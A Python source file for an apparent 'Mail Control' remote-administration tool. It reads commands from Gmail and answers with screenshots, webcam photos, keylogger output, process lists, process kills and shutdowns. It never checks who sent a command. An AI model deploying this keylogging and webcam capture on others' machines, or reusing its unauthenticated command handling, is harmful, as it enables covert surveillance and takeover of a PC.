from threading import Thread

from constant import *
from GUI import *
from loading import *
from utilities import *


class Mail:
    def __init__(self):
        self.sender: str = ""
        self.cmd_list: list = []
        self.attachment: str = ""

        self.body: str = ""  # Reply message
        self.subject: str = "Re: Mail Control: "
        self.email_message: MIMEMultipart

    def fetch_mail(self):
        try:
            # ? Login to the mail server and select the inbox
            mail = imaplib.IMAP4_SSL("imap.gmail.com")
            mail.login(USERNAME, APP_PASS)
            mail.select("inbox")

            #! Get all the mail with subject "Mail Control"
            *_, message = mail.search(None, '(UNSEEN SUBJECT "Mail Control")')
            ids = message[0].split()

            # ? Get the body of the mail
            for id in ids:
                *_, msg_data = mail.fetch(id, "(RFC822)")
                email_body = email.message_from_bytes(msg_data[0][1])
                self.sender, self.cmd_list = decode_mail(email_body)

            mail.logout()
        except:
            pass

    def send_mail(self):
        try:
            with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
                smtp.starttls()
                smtp.login(USERNAME, APP_PASS)

                smtp.sendmail(USERNAME, self.sender, self.email_message.as_string())
                print("\rMailed to", self.sender)
        except:
            pass

    def screenshot(self):
        self.attachment = capture_SS(self.cmd_list)
        self.set_info("Screenshot")

        self.body = "A screenshot of your PC taken at " + current_time() + "."
        self.email_message.attach(MIMEText(self.body, "plain"))

        with open(self.attachment, "rb") as picture_file:
            picture_attachment = MIMEImage(
                picture_file.read(), name=os.path.basename(self.attachment)
            )
            self.email_message.attach(picture_attachment)

    def webcam(self):
        self.attachment, self.body = capture_webcam(self.cmd_list)
        self.set_info("Webcam")

        self.email_message.attach(MIMEText(self.body, "plain"))

        with open(self.attachment, "rb") as picture_file:
            picture_attachment = MIMEImage(
                picture_file.read(), name=os.path.basename(self.attachment)
            )
            self.email_message.attach(picture_attachment)

    def keylogger(self):
        self.attachment, duration = key_logger(self.cmd_list)
        self.set_info("Keylog")

        self.body = (
            "The program records your keystrokes for " + str(duration) + " seconds."
        )
        self.email_message.attach(MIMEText(self.body, "plain"))

        with open(self.attachment, "r") as text_file:
            text_attachment = MIMEText(text_file.read())
            text_attachment.add_header(
                "Content-Disposition", "attachment; filename= Keylogger.txt"
            )
            self.email_message.attach(text_attachment)

    #! Add log to logout shutdown
    def logout(self):
        self.set_info("Logout")
        self.body = "Logged out of your PC."
        self.email_message.attach(MIMEText(self.body, "plain"))

        self.send_mail()
        os.system("shutdown -l")

    def shutdown(self):
        time = self.cmd_list[1] if len(self.cmd_list) > 1 else 10

        self.set_info("Shutdown")
        self.body = "Shutting down your PC in " + str(time) + " seconds."
        self.email_message.attach(MIMEText(self.body, "plain"))

        self.send_mail()  #! only shutdown process has the send_mail inside
        sleep(2)
        os.system("shutdown /s /t now")

    def list_app(self):
        self.attachment = list_running_application()

        self.set_info("List Applications")
        self.body = "The list of running applications of your PC."
        self.email_message.attach(MIMEText(self.body, "plain"))

        with open(self.attachment, "r") as text_file:
            text_attachment = MIMEText(text_file.read())
            text_attachment.add_header(
                "Content-Disposition", "attachment; filename= RunningApplications.txt"
            )
            self.email_message.attach(text_attachment)

    def list_process(self):
        self.attachment = list_running_process()

        self.set_info("List Processes")
        self.body = "The list of running processes of your PC."
        self.email_message.attach(MIMEText(self.body, "plain"))

        with open(self.attachment, "r") as text_file:
            text_attachment = MIMEText(text_file.read())
            text_attachment.add_header(
                "Content-Disposition", "attachment; filename= RunningProcesses.txt"
            )
            self.email_message.attach(text_attachment)

    def terminate_process(self):
        try:
            self.set_info("Terminate Process")
            self.body = kill_process(self.cmd_list[1])
        except IndexError:
            self.set_info("Terminate Process Failed")
            self.body = "ERROR: Missing argument.\n"
        self.email_message.attach(MIMEText(self.body, "plain"))

    def send_log(self):
        file_path = "Files\\mail.log"
        self.set_info("Log File")

        self.body = "Program's log file."
        self.email_message.attach(MIMEText(self.body, "plain"))

        with open(file_path, "r") as text_file:
            text_attachment = MIMEText(text_file.read())
            text_attachment.add_header(
                "Content-Disposition", "attachment; filename= mail.log"
            )
            self.email_message.attach(text_attachment)

    def help(self):
        self.body += list_command()
        self.set_info("Help")
        self.email_message.attach(MIMEText(self.body, "plain"))

    def process_command(self):
        command = {
            "screenshot": [self.screenshot, "perform capturing screenshot"],
            "webcam": [self.webcam, "perform capturing from webcam"],
            "keylog": [self.keylogger, "perform keylogging"],
            "logout": [self.logout, "logout from your PC"],
            "shutdown": [self.shutdown, "shutdown your PC"],
            "listApp": [self.list_app, "list running applications"],
            "listProcess": [self.list_process, "list running processes"],
            "terminateProcess": [self.terminate_process, "terminate a process"],
            "log": [self.send_log, "get the log file of your PC"],
            "help": [self.help, "get the list of commands"],
        }

        if self.cmd_list[0] in command:
            try:
                command[self.cmd_list[0]][0]()
            except Exception:
                print(f"ERROR: Cannot {command[self.cmd_list[0]][1]}")
        else:
            self.body = "ERROR: Invalid command.\n"
            self.help()

    def write_log(self):
        note2log(self.sender, self.cmd_list, self.attachment, self.body)

    def set_info(self, message: str):
        self.email_message = MIMEMultipart()
        self.email_message["From"] = USERNAME
        self.email_message["To"] = self.sender
        self.email_message["Subject"] = self.subject + message

    def refresh(self):
        self.sender = ""
        self.cmd_list = []
        self.attachment = ""

        self.body = ""
        self.email_message = None

    def run(self, app):
        self.fetch_mail()
        if self.cmd_list:
      
            self.process_command()
            self.write_log()

            print(self.body, self.attachment)
            command = " ".join(self.cmd_list)
            app.add_new_mail(self.sender, command, current_time(), self.body, self.attachment)

            self.send_mail()
            self.refresh()

            # if not spinner.process.is_alive():
            #     spinner = CLI_Spinner("\rWaiting for new mail", 0.5)
            #     spinner.start()
            
        app.after(1000, lambda : self.run(app))
